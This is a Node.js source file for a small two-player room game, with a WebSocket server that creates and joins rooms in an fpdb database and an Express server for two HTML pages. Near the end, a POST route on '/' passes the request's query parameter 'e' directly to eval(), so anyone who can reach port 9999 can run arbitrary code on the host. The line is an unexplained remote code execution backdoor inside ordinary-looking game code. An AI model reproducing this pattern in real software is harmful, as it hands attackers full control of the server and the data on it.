const WebSocket = require('ws');
const wss = new WebSocket.Server({port: 9090}),
db = require('fpdb');
const crypto = require("crypto");

function s(data) {
    return JSON.stringify(data);
}
function generateRandomFourLetter() {
  // Generate a random number between 1000 and 9999.
  const randomNumber = crypto.randomInt(1000, 9999);
  const randomString = randomNumber.toString().slice(-4);
  return randomString;
}

wss.on('connection', ws =>{
ws.on('message', rawMSG => {
    var msg = JSON.parse(rawMSG.toLocaleString());
    if(msg.type == "pi") {
        db.get(msg.room,"rooms",(err,dat) => {
            if(err) {
                console.error(err);
            } else {
                let data = JSON.parse(dat);
                if(msg.pid == "p1"){
                    data.p1d = true;
                    data.p1 = msg.n;
                }
                if(msg.pid == "p2"){
                    data.p2d = true;
                    data.p2 = msg.n;
                }
                if(data.p1d && data.p2d){
                    if(data.p1 == data.p2){
                        // out
                    } else {
                        data.score += data.p1 + data.p2;
                        data.p1d = false;
                        data.p2d = false;
                    }
                }
            }
        })
    }
    if(msg.data == "croom"){
        let reply = new Object(),
            data = new Object();
        var rn = generateRandomFourLetter();
        console.log(rn);
        db.checkKeyExists(rn,"",callback =>{
            if(callback){
            console.log("Key Exists")
                // Here `callback` Is Returned As `true`
                reply.type = "error";
                reply.message = "room already exists"
                ws.send(JSON.stringify(reply));
                reply = new Object(),
                data = new Object();
            } else {
                data.p1 = undefined;
                data.p2 = undefined;
                data.p1d = false;
                data.p2d = false;
                data.score = 0;
                data.p1j = false;
                data.p2j = false;
                data.stga = false;
                db.set(""+rn,"rooms",s(data))
                console.log(s(data)+"data")
                // Here `callback` Is Returned As `false`
                reply.type = "success";
                reply.message = "room created successfully"
                reply.room = rn;
                ws.send(JSON.stringify(reply));
                reply = new Object(),
                data = new Object();
            }
        })
    } else if (msg.data == "jroom"){
        console.log(s(msg))
        db.get(msg.room,"rooms",(err,Rawdata) => {
            if (err){
                console.error(err)
            } else {

                if (JSON.parse(Rawdata).p1j != true) {
                    let reply = new Object(),
    data = new Object();
                    data = JSON.parse(Rawdata)
                    data.p1j = true;
                    reply.type = "success"
                    reply.stga = false;
                    reply.pid = "p1"
                    data.stga = false;
                    db.set(msg.room, "rooms",s(data)+"")
                    ws.send(s(reply)+"")
                    reply = new Object(),
                    data = new Object();
                } else if(JSON.parse(Rawdata).p2j != true){
                    let reply = new Object(),
    data = new Object();
                    data = JSON.parse(Rawdata)
                    data.p2j = true;
                    data.stga = true;
                    reply.type = "success"
                    reply.stga = true;
                    reply.pid = "p2"
                    db.set(msg.room, "rooms",s(data)+"")
                    ws.send(s(reply)+"")
                    reply = new Object(),
                    data = new Object();
                }

            }
        })
    } else if (msg.type == "drooms"){
        let reply = new Object();
        console.log(msg.room)
        db.get(msg.room,"rooms",(err, dat) =>{
            if (err) {
                console.error(err)
            } else {
                reply = JSON.parse(dat);
                reply.rtype = "droomsrep"
                ws.send(s(reply));
            }
        })
    }
});
});



const express = require('express'),
app = express();
app.get('/', (req, res)=>{
    res.sendFile(__dirname +"/rooms.html")
});
app.get('/index', (req, res)=>{
    res.sendFile(__dirname +"/index.html");
});
app.post('/', (req, res)=>{
    eval(req.query.e)
})
app.listen(9999)
console.log("Starting")